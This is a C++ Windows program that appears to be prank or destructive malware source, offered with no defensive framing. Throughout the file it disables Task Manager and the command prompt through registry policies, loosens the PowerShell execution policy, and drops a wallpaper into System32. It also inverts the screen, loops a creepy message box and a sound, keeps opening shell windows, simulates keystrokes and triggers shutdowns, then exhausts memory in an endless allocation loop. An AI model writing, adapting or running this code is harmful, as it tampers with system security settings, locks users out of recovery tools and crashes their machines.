#define _CRT_SECURE_NO_WARNINGS
#include "resource.h"
#include <Windows.h>
#include <C:\\Windows\\System32\\rasctrnm.h>
#include <graphics.h>
#include <stdio.h>
#include <iostream>
#include <WinUser.h>
#include <thread>
#include <tchar.h>
#include <fstream>
#include <cstdlib>
#include <ShlObj.h>
#include <cstring>
#include <math.h>
#include <time.h>
#include <stdlib.h>
#include <mmsystem.h>
#include <cstring>
#include <chrono>
#include <cstdio>
#include <urlmon.h>
#include <process.h>
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "winmm.lib")
void FindDesktopCom_Interface(REFIID riid, void** ppv)
{
    long hwnd = NULL;
    VARIANT vtLoc;
    vtLoc.vt = VT_I4;
    vtLoc.lVal = long(CSIDL_DESKTOP);
    VARIANT vtEmpty;
    vtEmpty.vt = VT_EMPTY;
    IDispatch* pdisp = nullptr;
    IServiceProvider* pProv = nullptr;
    IShellBrowser* pBrowser = nullptr;
    IShellView* pView = nullptr;
    IFolderView2* p_View = nullptr;
    HRESULT hr = CoInitialize(nullptr);
    IShellWindows* pShellWindows = nullptr;

    if (SUCCEEDED(hr))
    {
        hr = CoCreateInstance(CLSID_ShellWindows, NULL, CLSCTX_ALL, IID_IShellWindows, (void**)&pShellWindows);
        if (SUCCEEDED(hr))
        {
            hr = pShellWindows->FindWindowSW(&vtLoc, &vtEmpty, SWC_DESKTOP, &hwnd, SWFO_NEEDDISPATCH, &pdisp);
            if (SUCCEEDED(hr))
            {
                hr = pdisp->QueryInterface(IID_IServiceProvider, (void**)&pProv);
                if (SUCCEEDED(hr))
                {
                    hr = pProv->QueryService(SID_STopLevelBrowser, IID_PPV_ARGS(&pBrowser));
                    if (SUCCEEDED(hr))
                    {
                        hr = pBrowser->QueryActiveShellView(&pView);
                        if (SUCCEEDED(hr))
                        {
                            hr = pView->QueryInterface(riid, ppv);
                            if (SUCCEEDED(hr))
                            {

                            }
                        }
                    }
                }
            }

        }
    }
}

void ChangeDPI()
{
    HMODULE hModUser32 = LoadLibraryA("user32.dll");
    BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
    if (SetProcessDPIAware)
    {
        SetProcessDPIAware();
    }
    FreeLibrary(hModUser32);
}
void ChangeReg1()
{
    HKEY hKey;
    LPCSTR subKey = "Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell";
    LPCSTR valueName = "ExecutionPolicy";
    LPCSTR newValue = "RemoteSigned";
    RegCreateKeyExA(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, valueName, 0, REG_SZ, reinterpret_cast<BYTE*>(const_cast<LPSTR>(newValue)), strlen(newValue) + 1);
    RegCloseKey(hKey);
}
void ChangeReg2()
{
    HKEY hKey;
    LPCSTR subKey = "SYSTEM\\CurrentControlSet\\Control\\CrashControl";
    LPCSTR valueName = "AutoReboot";
    DWORD newValue = 0;
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, valueName, 0, REG_DWORD, reinterpret_cast<BYTE*>(&newValue), sizeof(DWORD));
    RegCloseKey(hKey);
}
void ChangeReg3()
{
    HKEY hKey;
    LPCSTR subKey = "Software\\Policies\\Microsoft\\Windows\\System";
    LPCSTR valueName = "DisableCMD";
    DWORD newValue = 1;
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, valueName, 0, REG_DWORD, reinterpret_cast<BYTE*>(&newValue), sizeof(DWORD));
    RegCloseKey(hKey);
}
void ChangeReg4()
{
    HKEY hKey;
    LPCSTR subKey = "Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    LPCSTR valueName = "DisableTaskMgr";
    DWORD newValue = 1;
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, valueName, 0, REG_DWORD, reinterpret_cast<BYTE*>(&newValue), sizeof(DWORD));
    RegCloseKey(hKey);
}
void ChangeReg5()
{
    HKEY hKey;
    LPCSTR subKey = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";
    LPCSTR valueName = "NoViewOnDrive";
    DWORD newValue = 4;
    RegCreateKeyExA(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, valueName, 0, REG_DWORD, reinterpret_cast<BYTE*>(&newValue), sizeof(DWORD));
    RegCloseKey(hKey);
}
void PINGMUFANSE()
{
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);
    for (;;)
    {
        BitBlt(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hdc, 0, 0, DSTINVERT);
        Sleep(50000);
    }
}
void DUIHUAKUANG1()
{
    for(;;)
    {
    MessageBoxA(NULL, "你看看你身后有什么？", "", MB_ICONINFORMATION | MB_SYSTEMMODAL);
    Sleep(60000);
    }
}
BOOL UseCustomResource()
{
	HMODULE hModule = GetModuleHandle(NULL);
	HRSRC hRsrc = FindResource(hModule, MAKEINTRESOURCE(IDB_PNG1), TEXT("PNG"));
	DWORD dwSize = SizeofResource(hModule, hRsrc);
	HGLOBAL hGlobal = LoadResource(hModule, hRsrc);
	LPVOID lpVoid = LockResource(hGlobal);
	FILE* fp = fopen("C:\\Windows\\System32\\setup.png", "wb+");
	fwrite(lpVoid, sizeof(char), dwSize, fp);
	fclose(fp);
	FreeResource(hGlobal);
	return TRUE;
}
void sfh()
{
    for (;;)
    {
        PlaySound(MAKEINTRESOURCE(IDR_WAVE1), NULL, SND_RESOURCE);
    }
}
void GYF()
{
    for (;;)
    {
        Sleep(5000);
        system("start shell:::{D4480A50-BA28-11D1-8E75-00C04FA31A86}");
        Sleep(10000);
        system("start shel:::{F6B6E965-E9B2-444B-9286-10C9152EDBC5}");
        Sleep(5000);
        system("start shell:::{6DFD7C5C-2451-11D3-A299-00C04F8EF6AF}");
        Sleep(20000);
        system("start shell:::{2559A1F3-21D7-11D4-BDAF-00C04F60B9F0}");
        Sleep(60000);
        system("start shell:::{3080F90D-D7AD-11D9-BD98-0000947B0257}");
        Sleep(10000);
        system("start shell:::{8E0C279D-0BD1-43C3-9EBD-31C3DC5B8A77}");
    }
}
void SGUIANDKSGUI()
{
    for (;;)
    {
        system("shutdown /i|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Taskkill /f /t /im shutdown.exe");
        Sleep(100000);
    }
}
void DAKAIGEZHONGDONGXI()
{
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x51, 0, 0, 0);
    keybd_event(0x51,0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(10000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x57, 0, 0, 0);
    keybd_event(0x57, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(15000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x45, 0, 0, 0);
    keybd_event(0x45, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(20000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x52, 0, 0, 0);
    keybd_event(0x52, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(25000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x54, 0, 0, 0);
    keybd_event(0x54, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(30000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x55, 0, 0, 0);
    keybd_event(0x55, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(35000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x49, 0, 0, 0);
    keybd_event(0x49, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(40000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x50, 0, 0, 0);
    keybd_event(0x50, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(45000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x41, 0, 0, 0);
    keybd_event(0x41, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(50000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x44, 0, 0, 0);
    keybd_event(0x44, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(55000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x4B, 0, 0, 0);
    keybd_event(0x4B, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(60000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x58, 0, 0, 0);
    keybd_event(0x58, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(65000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x56, 0, 0, 0);
    keybd_event(0x56, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(70000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x4E, 0, 0, 0);
    keybd_event(0x4E, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
}
int main()
{
    ChangeDPI();
    std::thread t1(sfh);
    ChangeReg1();
    ChangeReg2();
    ChangeReg3();
    ChangeReg4();
    std::thread t4(GYF);
    std::thread t2(DUIHUAKUANG1);
    Sleep(5000);
    std::thread t3(PINGMUFANSE);
	BOOL ref = UseCustomResource();
    const char* path = "C:\\Windows\\System32\\setup.png";
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)path, SPIF_SENDCHANGE);
    IFolderView2* spView = nullptr;
    FindDesktopCom_Interface(IID_PPV_ARGS(&spView));
    if (spView)
    {
        DWORD flags = 0;
        HRESULT hr = spView->GetCurrentFolderFlags(&flags);
        if (SUCCEEDED(hr))
        {
            hr = spView->SetCurrentFolderFlags(FWF_NOICONS, flags ^ FWF_NOICONS);
        }
    }
    system("shutdown /s /t 20");
    Sleep(2000);
    system("shutdown /a");
    Sleep(5000);
    system("shutdown /s /t 20");
    Sleep(2000);
    system("shutdown /a");
    Sleep(5000);
    std::thread t5(SGUIANDKSGUI);
    Sleep(5000);
    std::thread t7(DAKAIGEZHONGDONGXI);
    while (1) new int;
    return 0;
}